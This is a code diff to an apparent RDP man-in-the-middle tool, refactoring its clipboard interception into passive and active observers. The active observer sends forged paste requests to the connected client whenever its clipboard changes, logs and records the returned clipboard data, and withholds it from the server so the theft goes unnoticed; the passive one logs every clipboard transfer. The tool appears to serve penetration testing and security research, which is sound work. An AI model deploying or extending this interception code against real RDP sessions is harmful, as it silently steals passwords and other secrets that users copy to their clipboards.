@@ -5,15 +5,19 @@ from rdpy.core.observer import Observer
 from rdpy.enum.core import ParserMode
 from rdpy.enum.rdp import RDPPlayerMessageType
 from rdpy.enum.virtual_channel.clipboard import ClipboardMessageType, ClipboardFormat
-from rdpy.pdu.rdp.virtual_channel.clipboard import FormatDataResponsePDU, FormatDataRequestPDU
+from rdpy.layer.layer import Layer
+from rdpy.parser.rdp.virtual_channel.clipboard import ClipboardParser
+from rdpy.pdu.rdp.virtual_channel.clipboard import FormatDataResponsePDU, FormatDataRequestPDU, ClipboardPDU
+from rdpy.recording.recorder import Recorder
 
 
-class MITMClipboardChannelObserver(Observer):
+class PassiveClipboardChannelObserver(Observer):
     """
-    MITM observer to intercept clipboard data from the Clipboard virtual channel.
+    MITM observer that passively intercept clipboard data from the Clipboard virtual channel as they
+    get transferred.
     """
 
-    def __init__(self, layer, recorder, mode, **kwargs):
+    def __init__(self, layer: Layer, recorder: Recorder, mode: ParserMode, **kwargs):
         """
         :type layer: rdpy.core.layer.Layer
         :type recorder: rdpy.recording.recorder.Recorder
@@ -21,14 +25,16 @@ class MITMClipboardChannelObserver(Observer):
         """
         Observer.__init__(self, **kwargs)
 
+        self.clipboardParser = ClipboardParser()
         self.peer = None
         self.layer = layer
         self.recorder = recorder
+        self.forwardNextDataResponse = True
         self.mitm_log = logging.getLogger("mitm.clipboard.{}"
                                           .format("client" if mode == ParserMode.CLIENT else "server"))
         self.mitm_clipboard_log = logging.getLogger(self.mitm_log.name + ".data")
 
-    def onPDUReceived(self, pdu):
+    def onPDUReceived(self, pdu: ClipboardPDU):
         """
         Called when a PDU on the observed layer is received.
         :param pdu: the PDU that was received.
@@ -40,29 +46,40 @@ class MITMClipboardChannelObserver(Observer):
         if self.peer:
             self.peer.sendPDU(pdu)
 
-    def sendPDU(self, pdu):
+    def sendPDU(self, pdu: ClipboardPDU):
         """
-        Send a clipboard PDU through the layer.
-        :type pdu: rdpy.pdu.rdp.virtual_channel.clipboard.ClipboardPDU
+        Log and record every FormatDataResponsePDU (clipboard data).
+        Transfer only the FormatDataResponsePDU if it didn't originate from the Active clipboard stealer.
+        For the other PDUs, just transfer it.
         """
-        self.layer.send(pdu)
+        if not isinstance(pdu, FormatDataResponsePDU):
+            self.layer.send(self.clipboardParser.write(pdu))
+        else:
+            if self.forwardNextDataResponse:
+                self.layer.send(self.clipboardParser.write(pdu))
+            if isinstance(pdu, FormatDataResponsePDU):
+                self.mitm_clipboard_log.info(hexlify(pdu.requestedFormatData))
+                self.recorder.record(pdu, RDPPlayerMessageType.CLIPBOARD_DATA)
+                self.forwardNextDataResponse = True
 
 
-class MITMClientClipboardChannelObserver(MITMClipboardChannelObserver):
+class ActiveClipboardChannelObserver(PassiveClipboardChannelObserver):
+    """
+    Observer that actively sends fake paste requests when its client sends a clipboard changed (FORMAT_LIST_RESPONSE)
+    packet.
+    """
 
-    def __init__(self, layer, recorder, **kwargs):
-        MITMClipboardChannelObserver.__init__(self, layer, recorder, ParserMode.CLIENT, **kwargs)
-        self.serverClipboardObserver = None  # The MITMClientClipboardServer needs to set this when its created.
+    def __init__(self, layer, recorder, mode: ParserMode, **kwargs):
+        PassiveClipboardChannelObserver.__init__(self, layer, recorder, mode, **kwargs)
 
-    def onPDUReceived(self, pdu):
+    def onPDUReceived(self, pdu: ClipboardPDU):
         """
         If a format list response is received, send a request to the client for the clipboard data.
         Make sure that the response to this request is NOT transferred to the server, as it can make
         the connection crash.
         For every other messages, just transfer the message normally.
-        :type pdu: rdpy.pdu.rdp.virtual_channel.clipboard.ClipboardPDU
         """
-        MITMClipboardChannelObserver.onPDUReceived(self, pdu)
+        PassiveClipboardChannelObserver.onPDUReceived(self, pdu)
         if pdu.msgType == ClipboardMessageType.CB_FORMAT_LIST_RESPONSE:
             self.sendPasteRequest()
 
@@ -74,31 +91,4 @@ class MITMClientClipboardChannelObserver(MITMClipboardChannelObserver):
         """
         formatDataRequestPDU = FormatDataRequestPDU(ClipboardFormat.GENERIC)
         self.peer.sendPDU(formatDataRequestPDU)
-        self.serverClipboardObserver.forwardNextDataResponse = False
-
-
-class MITMServerClipboardChannelObserver(MITMClipboardChannelObserver):
-
-    def __init__(self, layer, recorder, clientClipboardObserver, **kwargs):
-        """
-        :type layer: rdpy.core.newlayer.Layer
-        :type recorder: rdpy.recording.recorder.Recorder
-        :type clientClipboardObserver: MITMClientClipboardChannelObserver
-        """
-        MITMClipboardChannelObserver.__init__(self, layer, recorder, ParserMode.SERVER, **kwargs)
-        self.forwardNextDataResponse = True
-        clientClipboardObserver.serverClipboardObserver = self
-
-    def onPDUReceived(self, pdu):
-        """
-        Log and record every FormatDataResponsePDU (clipboard data).
-        Transfer only the FormatDataResponsePDU if it didn't originate from the MITM.
-        For the other PDUs, just transfer it.
-        :type pdu: rdpy.pdu.rdp.virtual_channel.clipboard.ClipboardPDU
-        """
-        if self.forwardNextDataResponse:
-            MITMClipboardChannelObserver.onPDUReceived(self, pdu)
-        if isinstance(pdu, FormatDataResponsePDU):
-            self.mitm_clipboard_log.info(hexlify(pdu.requestedFormatData))
-            self.recorder.record(pdu, RDPPlayerMessageType.CLIPBOARD_DATA)
-            self.forwardNextDataResponse = True
+        self.forwardNextDataResponse = False
